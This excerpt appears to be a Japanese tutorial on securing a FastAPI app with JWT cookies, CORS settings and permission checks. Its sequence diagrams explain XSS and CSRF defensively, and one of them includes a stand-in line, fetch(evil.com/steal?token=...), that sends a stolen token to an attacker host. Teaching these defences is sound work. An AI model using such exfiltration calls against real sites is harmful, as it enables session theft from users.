...
sequenceDiagram
    ...
    S->>S: パスワード検証 -> JWT を生成
    S-->>C: Set-Cookie: access_token=<JWT>#59; HttpOnly#59; SameSite=Lax 
...
JWTの中身や署名が有効なものかどうかを確認したい場合は[JWT.io](https://www.jwt.io/ja) が便利です。

<img src="img/jwt_io.png" width="800px"></img>
...
from fastapi import APIRouter, Depends, HTTPException, Response, status  # <- 追加: Response
from app.config import env
from app.schemas import UserCreate, UserRead, UserUpdate, UserLogin  # <- 追加: UserLogin
...
sequenceDiagram
    ...
    participant S as サイト (掲示板など)
    participant V as 被害者のブラウザ
    participant E as evil.com (攻撃者サーバー)

    Note over A,S: 1. 悪意ある JS を仕込む
    A->>S: 投稿に <script> を含めて送信
    S->>S: エスケープせず保存

    Note over S,V: 2. 被害者がページを閲覧
    V->>S: ページをリクエスト
    S-->>V: <script> を含む HTML を返す
    V->>V: 注入された JS が実行される

    Note over V,E: 3. JS がトークンを盗もうとする
    alt HttpOnly でない Cookie の場合
        V->>V: document.cookie でトークンを読める
        V->>E: fetch(evil.com/steal?token=...)
        Note over E: トークン盗難に成功
    else HttpOnly Cookie の場合
        V->>V: document.cookie は HttpOnly のため空
        Note over V: トークンを取得できず盗難失敗
    end
```
...
```mermaid
sequenceDiagram
    participant A as SNS
    participant U as ユーザーのブラウザ
    participant E as evil.com<br>(攻撃者のサイト)

    Note over U,A: 1. SNS にログイン
    U->>A: ログイン (ID + パスワード)
    A->>U: Set-Cookie: access_token (Cookie にトークンを保持)

    Note over U,E: 2. 攻撃者サイトを訪れる
    U->>E: evil.com を閲覧
    E->>U: 自動 POST するフォーム HTML を返す

    Note over U,A: 3. フォームが自動で POST される
    alt SameSite なし の場合
        U->>A: POST /user/profile<br>(Cookie 自動付与)
        A->>U: 正規リクエストとして処理 -> 攻撃成功
    else SameSite=Lax の場合
        U->>A: POST /user/profile<br>(別サイトからの POST なので Cookie が付かない)
        A->>U: 401 未認証 -> 攻撃失敗
    end
```
...
```mermaid
sequenceDiagram
    participant F as フロントエンドサーバー<br>(frontend.myapp.com)
    participant B as ブラウザ
    participant A as API サーバー<br>(backend.myapp.com)

    Note over B,F: 1. ページを読み込む
    B->>F: GET https://frontend.myapp.com/<br>(画面と JS を取得)
    F->>B: HTML / JS を返す (オリジン = frontend.myapp.com)

    Note over B,A: 2. JS が別オリジンの API を叩く -> プリフライト
    B->>A: OPTIONS http://backend.myapp.com/api/...<br>(Origin: http://frontend.myapp.com)
    A->>B: HTTPヘッダ Access-Control-Allow-Origin

    Note over B,A: 3. JS が別オリジンの API を叩く -> 本リクエスト
    alt Access-Control-Allow-Origin が frontend.myapp.com と一致
        B->>A: 本来のリクエスト POST http://backend.myapp.com/api/...
        A->>B: レスポンス -> JS が読める
    else Access-Control-Allow-Origin が frontend.myapp.com と一致しない
        Note over B,A: ブラウザが本リクエストを送らない (CORS エラー)
    end
```
...
```python
# backend/app/routers.py
from app.permissions import PermissionType, require_permissions # <- 追加
...
def create_user(
    data: UserCreate,
    session: Session = Depends(get_session),
    _: User = Depends(require_permissions([PermissionType.USER_CREATE])),  # <- 変更: USER_CREATE 権限を要求
) -> User:
    # ...
...
def read_user(
    user_id: int,
    session: Session = Depends(get_session),
    _: User = Depends(require_permissions([PermissionType.USER_READ])),  # <- 変更: USER_READ 権限を要求
) -> User:
    # ...
...
def update_user(
    ...
    data: UserUpdate,
    session: Session = Depends(get_session),
    _: User = Depends(require_permissions([PermissionType.USER_UPDATE])),  # <- 変更: USER_UPDATE 権限を要求
) -> User:
    # ...
...
def delete_user(
    user_id: int,
    session: Session = Depends(get_session),
    _: User = Depends(require_permissions([PermissionType.USER_DELETE])),  # <- 変更: USER_DELETE 権限を要求
) -> None:
    # ...
```
...
```python
# backend/app/routers.py
from app.model import Role, RoleType, User, Item  # <- 追加: RoleType, Item
from app.schemas import UserCreate, UserRead, UserUpdate, UserLogin, ItemCreate, ItemRead, ItemUpdate  # <- 追加: ItemCreate, ItemRead, ItemUpdate
from app.permissions import PermissionType, require_permissions, check_resource_ownership, has_role # <- 追加: check_resource_ownership, has_role
